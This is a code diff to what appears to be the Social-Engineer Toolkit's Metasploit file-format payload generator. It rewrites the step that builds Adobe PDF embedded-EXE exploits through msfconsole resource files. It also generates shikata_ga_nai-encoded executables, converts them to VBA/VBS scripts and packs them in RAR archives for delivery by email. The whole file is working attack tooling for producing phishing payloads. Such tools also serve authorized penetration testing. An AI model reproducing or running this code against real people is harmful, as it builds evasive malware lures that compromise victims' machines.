@@ -20,6 +20,8 @@ users_home = os.getenv("HOME")
 # metasploit path
 meta_path=meta_path()
 
+print meta_path
+
 # define if we need apache or not for dll hijacking
 # define if use apache or not
 apache=0
@@ -42,6 +44,7 @@ for line in apache_check:
                 line2=line2.rstrip()
                 apache_path=line2.replace("APACHE_DIRECTORY=","")
                 apache=1
+		if os.path.isdir(apache_path + "/html"): apache_path = apache_path + "/html"
 
 ###################################################
 #        USER INPUT: SHOW PAYLOAD MENU            #
@@ -108,20 +111,17 @@ if exploit == "exploit/windows/fileformat/adobe_pdf_embedded_exe" or exploit == 
         if inputpdf == "":
             # change to default SET pdf
             print_info("Defaulting to BLANK PDF built into SET...")
-            inputpdf="INFILENAME=src/core/msf_attacks/form.pdf"
+            inputpdf= definepath + "/src/core/msf_attacks/form.pdf"
         # if no file exists defalt this
         if not os.path.isfile(inputpdf):
             print_warning("Unable to find PDF, defaulting to blank PDF.")
-            inputpdf="INFILENAME=src/core/msf_attacks/form.pdf"
-        # if pdf exists, we are good
-        if os.path.isfile(inputpdf):
-            inputpdf="INFILENAME="+inputpdf
+            inputpdf= definepath + "/src/core/msf_attacks/form.pdf"
 
     if choicepdf == '2':
-        inputpdf="INFILENAME=src/core/msf_attacks/form.pdf"
+        inputpdf= definepath + "/src/core/msf_attacks/form.pdf"
 
     if choicepdf == "":
-        inputpdf="INFILENAME=src/core/msf_attacks/form.pdf"
+        inputpdf= definepath + "/src/core/msf_attacks/form.pdf"
 
 exploit_counter=0
 
@@ -166,9 +166,27 @@ if exploit_counter == 0:
     print_info("Generating fileformat exploit...")
     # START THE EXE TO VBA PAYLOAD
     if exploit != 'custom/exe/to/vba/payload':
-        outfile = setdir + "/%s" % (outfile)
-        subprocess.Popen("%s/msfcli %s PAYLOAD=%s LHOST=%s LPORT=%s OUTPUTPATH=%s FILENAME=%s %s ENCODING=shikata_ga_nai %s E" % (meta_path,exploit,payload,rhost,lport,outpath,outfile,target,inputpdf), stderr=subprocess.PIPE, stdout=subprocess.PIPE, shell=True).wait()
-        subprocess.Popen("cp " + users_home + "/.msf4/local/%s %s" % (filename_code, setdir), stderr=subprocess.PIPE, stdout=subprocess.PIPE, shell=True)
+        output = setdir + "/%s" % (outfile)
+	if os.path.isfile(setdir + "/template.pdf"):
+		os.remove(setdir + "/template.pdf")
+	if os.path.isfile(users_home + "/.msf4/local/template.pdf"):
+		os.remove(users_home + "/.msf4/local/template.pdf")
+
+	filewrite = file(setdir + "/template.rc", "w")
+	filewrite.write("use exploit/windows/fileformat/adobe_pdf_embedded_exe\nset LHOST %s\nset LPORT %s\nset INFILENAME %s\nset FILENAME %s\nexploit\n" % (rhost,lport,inputpdf,output))
+	filewrite.close()
+	child = pexpect.spawn("%smsfconsole -r %s/template.rc" % (meta_path, setdir))
+	a = 1
+	while a == 1:
+		if os.path.isfile(setdir + "/template.pdf"):
+		        subprocess.Popen("cp " + users_home + "/.msf4/local/%s %s" % (filename_code, setdir), stderr=subprocess.PIPE, stdout=subprocess.PIPE, shell=True)
+			a = 2 #break
+		else:
+			print_status("Waiting for payload generation to complete...")
+			if os.path.isfile(users_home + "/.msf4/local/" + outfile):
+				subprocess.Popen("cp %s/.msf4/local/%s %s" % (users_home, outfile,setdir), shell=True)
+			time.sleep(3)
+
         print_status("Payload creation complete.")
         time.sleep(1)
         print_status("All payloads get sent to the %s directory" % (outfile))
@@ -181,13 +199,13 @@ if exploit_counter == 0:
         if noencode == 1:
             execute1=("exe")
             payloadname=("vb.exe")
-        subprocess.Popen("%smsfvenom -p %s %s %s -e shikata_ga_nai --format=%s > %s/%s" % (meta_path,payload,rhost,lport,execute1,setdir,payloadname), shell=True).wait()
+        subprocess.Popen("%smsfvenom -p %s %s %s -e shikata_ga_nai --format=%s > %s/%s" % (meta_path,payload,rhost,lport,execute1,setdir,payloadname), shell=True)
         if noencode == 0:
-            subprocess.Popen("%smsfencode -e x86/shikata_ga_nai -i %s/vb1.exe -o %s/vb.exe -t exe -c 3" % (meta_path,setdir,setdir), shell=True).wait()
+            subprocess.Popen("%smsfvenom -e x86/shikata_ga_nai -i %s/vb1.exe -o %s/vb.exe -t exe -c 3" % (meta_path,setdir,setdir), shell=True)
         # Create the VB script here
-        subprocess.Popen("%s/tools/exe2vba.rb %s/vb.exe %s/template.vbs" % (meta_path,setdir,setdir), shell=True).wait()
+        subprocess.Popen("%s/tools/exe2vba.rb %s/vb.exe %s/template.vbs" % (meta_path,setdir,setdir), shell=True)
         print_info("Raring the VBS file.")
-        subprocess.Popen("rar a %s/template.rar %s/template.vbs" % (setdir,setdir), shell=True).wait()
+        subprocess.Popen("rar a %s/template.rar %s/template.vbs" % (setdir,setdir), shell=True)
 
     # NEED THIS TO PARSE DELIVERY OPTIONS TO SMTP MAILER
     filewrite=file(setdir + "/payload.options","w")
